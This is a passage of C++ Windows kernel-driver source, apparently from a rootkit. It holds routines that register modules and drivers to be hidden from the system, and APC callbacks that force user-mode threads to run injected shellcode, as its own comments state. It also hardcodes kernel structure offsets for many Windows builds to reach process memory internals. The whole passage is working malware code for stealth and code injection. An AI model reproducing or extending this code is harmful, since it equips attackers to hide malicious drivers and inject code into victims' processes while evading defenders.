	entry->Links.InMemoryOrderLinks = item.Links.InMemoryOrderLinks;
	AddEntry(&this->hiddenModules, entry);
	return true;
}

/*
* Description:
* AddHiddenDriver is responsible for adding an item to the list of hidden drivers.
*
* Parameters:
* @item	  [_Inout_ HiddenDriverItem&] -- Driver to add.
*
* Returns:
* @bool								  -- Whether successfully added or not.
*/
_IRQL_requires_max_(APC_LEVEL)
bool MemoryHandler::AddHiddenDriver(_Inout_ HiddenDriverEntry& item) {
	if (!IsValidPath(item.DriverPath))
		return false;

	if (FindHiddenDriver(item.DriverPath, nullptr))
		return false;
	HiddenDriverEntry* driverEntry = AllocateMemory<HiddenDriverEntry*>(sizeof(HiddenDriverEntry));

	if (!driverEntry)
		return false;
	driverEntry->OriginalEntry = item.OriginalEntry;
	errno_t err = wcscpy_s(driverEntry->DriverPath, (wcslen(item.DriverPath) + 1) * sizeof(wchar_t), item.DriverPath);

	if (err != 0) {
		FreeVirtualMemory(driverEntry);
		return false;
	}
	AddEntry(&this->hiddenDrivers, driverEntry);
	return true;
}

/*
* Description:
* ApcInjectionCallback is responsible for handling the APC cleanup.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL;

	if (PsGetCurrentProcessWow64Process())
		PsWrapApcWow64Thread(NormalContext, (PVOID*)NormalRoutine);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

/*
* Description:
* PrepareApcCallback is responsible for force the APC execution.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

/*
* Description:
* GetVadRootOffset is responsible for getting the VadRoot offset depends on the windows version.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @vadRootOffset [ULONG] -- Offset of VAD root.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG MemoryHandler::GetVadRootOffset() const {
	ULONG vadRootOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return vadRootOffset;

	switch (WindowsBuildNumber) {
	case WIN_1507:
		vadRootOffset = 0x608;
		break;
	case WIN_1511:
		vadRootOffset = 0x610;
		break;
	case WIN_1607:
		vadRootOffset = 0x620;
		break;
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		vadRootOffset = 0x628;
		break;
	case WIN_1903:
	case WIN_1909:
		vadRootOffset = 0x658;
		break;
	case WIN_11_24H2:
		vadRootOffset = 0x558;
		break;
	default:
		vadRootOffset = 0x7d8;
		break;
	}

	return vadRootOffset;
}

/*
* Description:
* GetPageCommitmentLockOffset is responsible for getting the PageCommitmentLock offset depends on the windows version.
* 
* Parameters:
* There are no parameters.
* 
* Returns:
* @pageCommitmentLockOffset [ULONG] -- Offset of PageCommitmentLock.
*/
_IRQL_requires_max_(APC_LEVEL)
ULONG MemoryHandler::GetPageCommitmentLockOffset() const {
	ULONG pageCommitmentLockOffset = 0;

	if (WindowsBuildNumber > LATEST_VERSION)
		return pageCommitmentLockOffset;

	switch (WindowsBuildNumber) {
	case WIN_1507:
	case WIN_1511:
	case WIN_1607:
	case WIN_1703:
	case WIN_1709:
	case WIN_1803:
	case WIN_1809:
		pageCommitmentLockOffset = 0x370;
		break;
	case WIN_1903:
	case WIN_1909:
		pageCommitmentLockOffset = 0x378;
		break;
	case WIN_11_24H2:
		pageCommitmentLockOffset = 0x260;
		break;
	default:
		pageCommitmentLockOffset = 0x4d0;
		break;
	}

	return pageCommitmentLockOffset;
}